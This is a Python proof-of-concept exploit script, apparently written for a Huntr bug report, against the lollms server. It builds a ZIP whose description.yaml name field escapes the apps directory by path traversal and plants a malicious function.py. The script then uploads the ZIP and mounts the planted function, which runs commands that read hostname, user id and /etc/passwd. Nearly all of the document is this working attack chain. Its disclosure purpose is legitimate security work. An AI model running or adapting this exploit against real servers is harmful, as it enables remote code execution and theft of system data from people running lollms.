#!/usr/bin/env python3
"""
PoC: Path Traversal → RCE in ParisNeo/lollms
Huntr Report: b543ee87-5afb-4da8-b512-0b407222716b
Target: https://github.com/ParisNeo/lollms

Vulnerability: The `name` field in description.yaml (inside uploaded ZIP apps)
is used to construct file paths without sanitization, allowing ../ traversal
to write files outside the apps_zoo directory. Combined with the custom_function_calls
mounting mechanism, this leads to Remote Code Execution.

Setup:
  1. pip install lollms (or run from source)
  2. Start lollms server: lollms-server --port 9600
  3. Run this PoC (authenticated user required)

Usage:
  python3 poc_lollms_rce.py --target http://localhost:9600
"""

import argparse
import io
import json
import requests
import time
import sys
import websocket
import threading
import zipfile


def get_client_id(base_url):
    """Get client_id via WebSocket handshake."""
    client_id = [None]
    def on_message(ws, msg):
        try:
            data = json.loads(msg)
            cid = data.get("client_id") or data.get("data", {}).get("client_id")
            if cid:
                client_id[0] = cid
                ws.close()
        except Exception:
            pass
    ws = websocket.WebSocketApp(f"ws://{base_url.replace('http://', '')}/ws", on_message=on_message)
    t = threading.Thread(target=ws.run_forever, daemon=True)
    t.start()
    time.sleep(3)
    return client_id[0]


def create_malicious_zip():
    """Create a ZIP with path traversal in description.yaml name field."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Path traversal: escape apps_zoo into custom_function_calls
        zf.writestr("description.yaml", "name: ../custom_function_calls/evil_func\n")
        zf.writestr("function.py", (
            "import os\n"
            "def execute(**kwargs):\n"
            "    result = os.popen('id && hostname && cat /etc/passwd | head -5').read()\n"
            "    with open('/tmp/lollms_pwned', 'w') as f:\n"
            "        f.write('[+] RCE CONFIRMED: ' + result)\n"
            "    return {'status': 'executed', 'output': result}"
        ))
    buf.seek(0)
    return buf


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:9600")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}")

    # Step 1: Get client_id
    print("[*] Step 1: Getting client_id via WebSocket...")
    client_id = get_client_id(args.target)
    if not client_id:
        print("[!] Could not get client_id. Server may not be running.")
        print("[*] Alternative: set client_id manually and re-run")
        sys.exit(1)
    print(f"[+] client_id: {client_id}")

    # Step 2: Create and upload malicious ZIP
    print("[*] Step 2: Creating malicious ZIP with path traversal...")
    zbuf = create_malicious_zip()
    print("[*] Uploading ZIP to /upload_app...")
    r = requests.post(
        f"{args.target}/upload_app",
        params={"client_id": client_id},
        files={"file": ("exploit.zip", zbuf.getvalue(), "application/zip")},
        timeout=15,
    )
    print(f"  Upload status: {r.status_code}")
    if r.status_code not in (200, 201, 202):
        print(f"  Response: {r.text[:500]}")

    # Step 3: Mount the custom function
    print("[*] Step 3: Mounting evil_func from custom_function_calls...")
    r2 = requests.post(
        f"{args.target}/mount_function_call",
        json={"client_id": client_id, "function_category": "custom", "function_name": "evil_func"},
        timeout=10,
    )
    print(f"  Mount status: {r2.status_code}")

    # Step 4: Verify RCE
    time.sleep(2)
    try:
        with open("/tmp/lollms_pwned") as f:
            content = f.read()
            print(f"\n[+] VULNERABILITY CONFIRMED!")
            print(f"    {content.strip()}")
    except FileNotFoundError:
        print("[*] /tmp/lollms_pwned not found — check if server has write access to /tmp")
        print("[*] The path traversal may have succeeded but function execution requires additional setup")


if __name__ == "__main__":
    main()
